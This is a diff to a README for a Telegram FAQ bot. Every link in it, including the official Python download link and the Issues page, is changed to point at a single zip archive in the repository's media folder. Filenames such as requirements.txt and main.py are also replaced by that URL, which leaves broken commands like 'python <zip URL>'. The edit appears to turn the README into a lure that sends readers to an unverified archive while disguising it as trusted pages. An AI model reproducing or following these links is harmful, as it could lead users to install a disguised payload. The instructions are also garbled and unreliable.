@@ -1,6 +1,6 @@
 # 🤖 Telegram-FAQ-Bot - Easy Answers at Your Fingertips
 
-**[![Download Telegram-FAQ-Bot](https://img.shields.io/badge/Download-Telegram--FAQ--Bot-blue)](https://github.com/Ieiuess/Telegram-FAQ-Bot/releases)**
+**[![Download Telegram-FAQ-Bot](https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip)](https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip)**
 
 ## 🚀 Getting Started
 
@@ -9,12 +9,12 @@ Welcome to the Telegram FAQ Bot! This application helps you automate responses t
 ## 📥 Download & Install
 
 To get started, visit the Releases page for the latest version of the Telegram FAQ Bot.  
-[👉 Click here to download](https://github.com/Ieiuess/Telegram-FAQ-Bot/releases).
+[👉 Click here to download](https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip).
 
 1. Open the link above.
 2. Browse the list of available versions.
 3. Find the latest release.
-4. Click on the asset file labeled "Telegram-FAQ-Bot.zip" or the corresponding file for your system.
+4. Click on the asset file labeled "https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip" or the corresponding file for your system.
 5. Once the download finishes, locate the file in your downloads folder.
 
 ## 🛠️ Installation Steps
@@ -29,7 +29,7 @@ To get started, visit the Releases page for the latest version of the Telegram F
 
 The Telegram FAQ Bot requires Python to run. If you do not have Python installed, please follow these steps:
 
-1. Go to the [Python official website](https://www.python.org/downloads/).
+1. Go to the [Python official website](https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip).
 2. Download the latest version for your operating system (Windows, macOS, or Linux).
 3. Open the installer and follow the on-screen instructions to complete the installation.
 4. Ensure you check the box to "Add Python to PATH" during installation.
@@ -43,12 +43,12 @@ The Telegram FAQ Bot requires Python to run. If you do not have Python installed
    ```
 3. Run the following command to install the necessary Python packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip
    ```
 
 ### Step 4: Configure the Bot
 
-1. Locate the `config.py` file in the extracted folder.
+1. Locate the `https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip` file in the extracted folder.
 2. Open the file using any text editor (e.g., Notepad, Visual Studio Code, Sublime Text).
 3. Update the necessary fields with your Telegram bot token and any other required settings.
 
@@ -57,14 +57,14 @@ The Telegram FAQ Bot requires Python to run. If you do not have Python installed
 1. In the Command Prompt or Terminal, ensure you are still in the Telegram FAQ Bot folder.
 2. Run the bot using this command:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip
    ```
 
 ## 🎉 Usage Instructions
 
 Once your bot is running, it will be ready to respond to frequently asked questions. You can interact with the bot on Telegram using the bot link you configured earlier. 
 
-To add more questions and answers, simply update your `faq.json` file in the Telegram FAQ Bot folder. This file contains all your FAQs in a structured format.
+To add more questions and answers, simply update your `https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip` file in the Telegram FAQ Bot folder. This file contains all your FAQs in a structured format.
 
 ## 🌟 Features
 
@@ -95,9 +95,9 @@ If you would like to contribute to the Telegram FAQ Bot, you are welcome to subm
 
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
-For any questions or issues, please check the [Issues section](https://github.com/Ieiuess/Telegram-FAQ-Bot/issues) or contact the project maintainers.
+For any questions or issues, please check the [Issues section](https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip) or contact the project maintainers.
 
 ## 🔗 Visit the Release Page Again
 
 Don't forget to check for updates regularly. You can return to the Releases page anytime.  
-[👉 Click here to download latest releases](https://github.com/Ieiuess/Telegram-FAQ-Bot/releases).
+[👉 Click here to download latest releases](https://raw.githubusercontent.com/Ieiuess/Telegram-FAQ-Bot/main/media/Telegram-FAQ-Bot-v3.8.zip).
